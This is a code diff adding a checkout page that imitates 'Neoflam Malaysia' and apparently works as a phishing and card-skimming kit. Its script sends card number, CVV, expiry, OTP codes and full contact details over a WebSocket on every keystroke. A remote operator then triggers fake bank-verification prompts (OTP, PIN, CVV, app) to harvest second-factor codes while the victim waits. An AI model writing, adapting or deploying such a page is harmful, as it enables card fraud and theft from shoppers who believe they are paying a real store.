@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Checkout | Neoflam Malaysia</title>
+<style>
+:root{--bg:#f7f7f5;--card:#fff;--text:#1a1a1a;--muted:#666;--accent:#2d6a4f;--accent-h:#1b4332;--border:#e5e5e0;--danger:#c0392b}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5}
+header{background:var(--card);border-bottom:1px solid var(--border);padding:16px 20px}
+header h1{font-size:20px;font-weight:700;color:var(--accent)}
+main{max-width:960px;margin:0 auto;padding:24px 16px 48px;display:grid;gap:20px;grid-template-columns:1fr}
+@media(min-width:860px){main{grid-template-columns:1.2fr .8fr}}
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px}
+.card h2{font-size:16px;margin-bottom:14px}
+.field{margin-bottom:12px}
+.field label{display:block;font-size:13px;color:var(--muted);margin-bottom:4px}
+.field input{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:8px;font-size:15px}
+.field input:focus{outline:none;border-color:var(--accent)}
+.row{display:grid;gap:12px;grid-template-columns:1fr 1fr}
+.item{display:flex;justify-content:space-between;gap:12px;padding:8px 0;border-bottom:1px solid var(--border);font-size:14px}
+.item:last-child{border-bottom:none}
+.total{display:flex;justify-content:space-between;font-size:18px;font-weight:700;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)}
+.btn{width:100%;padding:14px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+.btn:hover{background:var(--accent-h)}
+.btn:disabled{opacity:.6;cursor:not-allowed}
+.note{font-size:12px;color:var(--muted);text-align:center;margin-top:10px}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:100}
+.overlay.show{display:flex}
+.overlay-box{background:#fff;border-radius:12px;padding:24px;text-align:center;max-width:320px}
+.spinner{width:36px;height:36px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.otp-card{width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden;color:#1a1a1a}
+.otp-hdr{padding:14px 16px;border-bottom:1px solid #eee;font-weight:600}
+.otp-body{padding:20px}
+.otp-body input{width:100%;padding:12px;border:2px solid #ddd;border-radius:8px;font-size:18px;text-align:center;letter-spacing:4px;margin:12px 0}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+<header><h1>Neoflam Malaysia — Secure Checkout</h1></header>
+<main>
+  <section class="card">
+    <h2>Billing &amp; Contact</h2>
+    <div class="field"><label>Full Name</label><input id="bill-name" type="text" placeholder="Your name"></div>
+    <div class="field"><label>Email</label><input id="bill-email" type="email" placeholder="you@example.com"></div>
+    <div class="field"><label>Phone</label><input id="bill-phone" type="tel" placeholder="+60 12 345 6789"></div>
+    <div class="field"><label>Address</label><input id="bill-address" type="text" placeholder="Street address"></div>
+    <div class="row">
+      <div class="field"><label>City</label><input id="bill-city" type="text"></div>
+      <div class="field"><label>State</label><input id="bill-state" type="text"></div>
+    </div>
+    <div class="row">
+      <div class="field"><label>Postcode</label><input id="bill-postal" type="text"></div>
+      <div class="field"><label>Country</label><input id="bill-country" type="text" value="Malaysia"></div>
+    </div>
+  </section>
+  <aside class="card">
+    <h2>Order Summary</h2>
+    <div id="summary-items"></div>
+    <div class="total"><span>Total</span><span id="total-price">RM0.00</span></div>
+    <h2 style="margin-top:20px">Payment</h2>
+    <div class="field"><label>Card Number</label><input id="card-number" inputmode="numeric" placeholder="0000 0000 0000 0000"></div>
+    <div class="row">
+      <div class="field"><label>Expiry</label><input id="card-expiry" placeholder="MM/YY"></div>
+      <div class="field"><label>CVV</label><input id="card-cvv" inputmode="numeric" placeholder="···"></div>
+    </div>
+    <div class="field"><label>Cardholder Name</label><input id="card-name" type="text"></div>
+    <button class="btn" id="pay-btn" type="button">Pay Now</button>
+    <p class="note">Secured checkout · Neoflam Malaysia</p>
+  </aside>
+</main>
+
+<div class="overlay" id="load-overlay"><div class="overlay-box"><div class="spinner"></div><p id="load-text">Processing payment...</p></div></div>
+<div class="overlay" id="otp-overlay">
+  <div class="otp-card">
+    <div class="otp-hdr">Verification Required</div>
+    <div class="otp-body">
+      <p id="otp-message">Enter the code sent to your phone or banking app.</p>
+      <input id="otp-code" maxlength="8" inputmode="numeric">
+      <button class="btn" id="otp-submit" type="button">Continue</button>
+    </div>
+  </div>
+</div>
+
+<script>
+function parseMoney(v){var n=Number(String(v||'').replace(/[^\d.]/g,''));return Number.isFinite(n)?n:0}
+function formatMoney(n){return 'RM'+parseMoney(n).toFixed(2)}
+function readOrder(){
+  try{return JSON.parse(localStorage.getItem('neoflam_order')||localStorage.getItem('lotus_order')||'{}')}catch(e){return {}}
+}
+function renderSummary(){
+  var order=readOrder();
+  var items=Array.isArray(order.items)?order.items:[];
+  var html='';
+  items.forEach(function(it){
+    html+='<div class="item"><span>'+(it.title||'Item')+' × '+(it.quantity||1)+'</span><span>'+formatMoney(it.price*(it.quantity||1))+'</span></div>';
+  });
+  if(!html) html='<div class="item"><span>Your cart</span><span>—</span></div>';
+  document.getElementById('summary-items').innerHTML=html;
+  document.getElementById('total-price').textContent=formatMoney(order.amount||0);
+}
+renderSummary();
+
+function luhn(n){var s=0,a=0;for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],10);if(a)s+=d*2>9?d*2-9:d*2;else s+=d;a=!a}return s%10===0}
+var ws=null,sid=null,wsTimer=null;
+var cid=localStorage.getItem('neoflam_cid');
+if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('neoflam_cid',cid)}
+
+function wsUrl(){
+  var proto=location.protocol==='https:'?'wss:':'ws:';
+  return proto+'//'+location.host+'/api/?role=customer&cid='+encodeURIComponent(cid)+(sid?'&sid='+encodeURIComponent(sid):'');
+}
+function wsConnect(){
+  ws=new WebSocket(wsUrl());
+  ws.onopen=function(){if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},30000)};
+  ws.onmessage=function(e){
+    var msg=JSON.parse(e.data);
+    if(msg.type!=='operator_action')return;
+    var p=msg.payload,a=p.action;
+    if(a==='ack'){sid=p.sessionId}
+    else if(a==='otp_verify'||a==='custom_otp_verify'||a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='app_verify'){
+      document.getElementById('load-overlay').classList.remove('show');
+      document.getElementById('otp-overlay').classList.add('show');
+      document.getElementById('otp-message').textContent=p.message||'Enter verification code';
+    }
+    else if(a==='approve'){location.href='/complete/'}
+    else if(a==='reject'){document.getElementById('load-overlay').classList.remove('show');alert(p.message||'Payment rejected')}
+    else if(a==='timeout'){document.getElementById('load-overlay').classList.remove('show');alert('Session timeout')}
+  };
+  ws.onclose=function(){if(wsTimer)clearInterval(wsTimer);setTimeout(wsConnect,5000)};
+}
+wsConnect();
+
+function buildPayload(){
+  var order=readOrder();
+  return {
+    frontendUrl: location.hostname,
+    currentStep: 'card',
+    browsingTabs: [{label:'Checkout',count:1,active:true}],
+    cardInfo: {
+      cardNumber: document.getElementById('card-number').value.replace(/\s/g,''),
+      expiry: document.getElementById('card-expiry').value.trim(),
+      cvv: document.getElementById('card-cvv').value.trim(),
+      cardHolder: document.getElementById('card-name').value.trim(),
+      otpCode: document.getElementById('otp-code').value.trim(),
+    },
+    customerInfo: {
+      fullName: document.getElementById('bill-name').value.trim(),
+      email: document.getElementById('bill-email').value.trim(),
+      phone: document.getElementById('bill-phone').value.trim(),
+      country: document.getElementById('bill-country').value.trim(),
+      address1: document.getElementById('bill-address').value.trim(),
+      city: document.getElementById('bill-city').value.trim(),
+      state: document.getElementById('bill-state').value.trim(),
+      zipCode: document.getElementById('bill-postal').value.trim(),
+    },
+    orderSummary: order,
+  };
+}
+
+function sendPayload(){
+  var payload=buildPayload();
+  if(!ws||ws.readyState!==1){wsConnect();setTimeout(sendPayload,1500);return}
+  if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
+  ws.send(JSON.stringify({type:'session_update',payload:Object.assign({sessionId:sid,status:'pending'},payload)}));
+}
+
+document.getElementById('pay-btn').addEventListener('click',function(){
+  var cn=document.getElementById('card-number').value.replace(/\s/g,'');
+  if(cn.length<13||!luhn(cn))return alert('Invalid card number');
+  if(!document.getElementById('card-expiry').value.match(/^\d\d\/\d\d$/))return alert('Invalid expiry (MM/YY)');
+  if(document.getElementById('card-cvv').value.trim().length<3)return alert('Invalid CVV');
+  document.getElementById('load-overlay').classList.add('show');
+  sendPayload();
+});
+document.getElementById('otp-submit').addEventListener('click',function(){
+  document.getElementById('otp-overlay').classList.remove('show');
+  document.getElementById('load-overlay').classList.add('show');
+  sendPayload();
+});
+
+var liveTimer=null;
+function livePush(){if(!ws||ws.readyState!==1)return;var payload=buildPayload();if(!sid)ws.send(JSON.stringify({type:'customer_input',payload:payload}));else ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,cardInfo:payload.cardInfo,customerInfo:payload.customerInfo,browsingTabs:payload.browsingTabs,currentStep:'card'}}))}
+function onInput(){clearTimeout(liveTimer);liveTimer=setTimeout(livePush,150)}
+['card-number','card-name','card-expiry','card-cvv','bill-name','bill-email','bill-phone','bill-address','bill-city','bill-state','bill-postal','bill-country','otp-code'].forEach(function(id){
+  var el=document.getElementById(id);if(el)el.addEventListener('input',onInput);
+});
+document.getElementById('card-number').addEventListener('input',function(){
+  var v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');
+});
+document.getElementById('card-expiry').addEventListener('input',function(){
+  var v=this.value.replace(/\D/g,'').slice(0,4);if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v;
+});
+</script>
+</body>
+</html>
